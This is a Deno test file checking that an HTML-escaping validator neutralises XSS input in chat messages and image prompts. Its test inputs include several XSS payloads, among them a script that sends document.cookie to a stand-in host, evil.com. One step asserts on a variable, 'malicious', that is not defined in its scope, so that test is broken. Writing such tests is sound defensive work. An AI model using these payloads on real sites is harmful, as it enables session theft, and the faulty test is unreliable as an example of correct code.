/**
 * XSS Sanitization Tests for validators.ts
 *
 * Tests the security fix for CWE-79 (Cross-Site Scripting)
 * CVSS Score: 6.1 (Medium-High)
 */

import { assertEquals, assertThrows } from "https://deno.land/std@0.220.0/assert/mod.ts";
import { MessageValidator, ImageRequestValidator } from "./validators.ts";

Deno.test("MessageValidator - XSS Prevention Tests", async (t) => {
  const validator = new MessageValidator();

  await t.step("should sanitize script tag injection", () => {
    const malicious = {
      role: "user",
      content: "<script>alert('XSS')</script>"
    };

    validator.validate(malicious);

    assertEquals(
      malicious.content,
      "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;",
      "Script tags should be encoded"
    );
  });

  await t.step("should sanitize cookie stealing attempt", () => {
    const malicious = {
      role: "user",
      content: "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
    };

    validator.validate(malicious);

    assertEquals(
      malicious.content,
      "&lt;script&gt;fetch(&#x27;https:&#x2F;&#x2F;evil.com?cookie=&#x27;+document.cookie)&lt;&#x2F;script&gt;",
      "Cookie stealing script should be encoded"
    );
  });

  await t.step("should sanitize image onerror XSS", () => {
    const malicious = {
      role: "user",
      content: "<img src=x onerror='alert(1)'>"
    };

    validator.validate(malicious);

    assertEquals(
      malicious.content,
      "&lt;img src=x onerror=&#x27;alert(1)&#x27;&gt;",
      "Image tag with onerror should be encoded"
    );
  });

  await t.step("should sanitize iframe injection", () => {
    const malicious = {
      role: "user",
      content: "<iframe src='javascript:alert(1)'></iframe>"
    };

    validator.validate(malicious);

    assertEquals(
      malicious.content,
      "&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;&lt;&#x2F;iframe&gt;",
      "Iframe with javascript: protocol should be encoded"
    );
  });

  await t.step("should sanitize event handler attributes", () => {
    const malicious = {
      role: "user",
      content: "<div onclick=\"alert('XSS')\">Click me</div>"
    };

    validator.validate(malicious);

    assertEquals(
      malicious.content,
      "&lt;div onclick=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;&#x2F;div&gt;",
      "Event handler attributes should be encoded"
    );
  });

  await t.step("should preserve normal content", () => {
    const normal = {
      role: "user",
      content: "Hello, how are you? I'm fine, thanks!"
    };

    validator.validate(normal);

    assertEquals(
      malicious.content,
      "Hello, how are you? I&#x27;m fine, thanks!",
      "Normal text should be preserved (with apostrophes encoded)"
    );
  });

  await t.step("should handle double-encoding safely", () => {
    const encoded = {
      role: "user",
      content: "&lt;already encoded&gt;"
    };

    validator.validate(encoded);

    assertEquals(
      encoded.content,
      "&amp;lt;already encoded&amp;gt;",
      "Already encoded entities should be double-encoded safely"
    );
  });

  await t.step("should handle mixed content", () => {
    const mixed = {
      role: "user",
      content: "I need help with <div> tags and I'm using JavaScript"
    };

    validator.validate(mixed);

    assertEquals(
      mixed.content,
      "I need help with &lt;div&gt; tags and I&#x27;m using JavaScript",
      "Mixed content should be partially sanitized"
    );
  });

  await t.step("should handle all dangerous characters", () => {
    const dangerous = {
      role: "user",
      content: "& < > \" ' /"
    };

    validator.validate(dangerous);

    assertEquals(
      dangerous.content,
      "&amp; &lt; &gt; &quot; &#x27; &#x2F;",
      "All dangerous characters should be encoded"
    );
  });

  await t.step("should still reject empty content after sanitization", () => {
    const empty = {
      role: "user",
      content: "   "
    };

    assertThrows(
      () => validator.validate(empty),
      Error,
      "Empty message content",
      "Empty content should still be rejected"
    );
  });
});

Deno.test("ImageRequestValidator - XSS Prevention Tests", async (t) => {
  const validator = new ImageRequestValidator();

  await t.step("should sanitize malicious prompt", () => {
    const malicious = {
      prompt: "<script>alert('XSS')</script>",
      mode: "generate"
    };

    validator.validate(malicious);

    assertEquals(
      malicious.prompt,
      "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;",
      "Prompt should be sanitized"
    );
  });

  await t.step("should preserve normal prompts", () => {
    const normal = {
      prompt: "Generate a beautiful sunset over the ocean",
      mode: "generate"
    };

    validator.validate(normal);

    assertEquals(
      normal.prompt,
      "Generate a beautiful sunset over the ocean",
      "Normal prompt should be preserved"
    );
  });

  await t.step("should sanitize prompt with HTML entities", () => {
    const html = {
      prompt: "Create an image with <b>bold</b> text",
      mode: "generate"
    };

    validator.validate(html);

    assertEquals(
      html.prompt,
      "Create an image with &lt;b&gt;bold&lt;&#x2F;b&gt; text",
      "HTML tags in prompt should be encoded"
    );
  });

  await t.step("should still reject empty prompt after sanitization", () => {
    const empty = {
      prompt: "   ",
      mode: "generate"
    };

    assertThrows(
      () => validator.validate(empty),
      Error,
      "Empty prompt",
      "Empty prompt should still be rejected"
    );
  });
});

Deno.test("Performance - Sanitization should not significantly impact validation", async (t) => {
  const validator = new MessageValidator();

  await t.step("should handle maximum length content efficiently", () => {
    const largeContent = "A".repeat(50000); // Max allowed length
    const message = {
      role: "user",
      content: largeContent
    };

    const start = performance.now();
    validator.validate(message);
    const duration = performance.now() - start;

    console.log(`Sanitization of 50k chars took ${duration.toFixed(2)}ms`);

    // Sanitization should complete in under 100ms even for max length
    assertEquals(
      duration < 100,
      true,
      "Sanitization should be performant for large content"
    );
  });

  await t.step("should handle content with many special characters", () => {
    const specialChars = "<>&\"'/".repeat(1000);
    const message = {
      role: "user",
      content: specialChars
    };

    const start = performance.now();
    validator.validate(message);
    const duration = performance.now() - start;

    console.log(`Sanitization of ${specialChars.length} special chars took ${duration.toFixed(2)}ms`);

    assertEquals(
      duration < 100,
      true,
      "Sanitization should handle many special characters efficiently"
    );
  });
});

console.log("\n✅ All XSS sanitization tests completed successfully!\n");
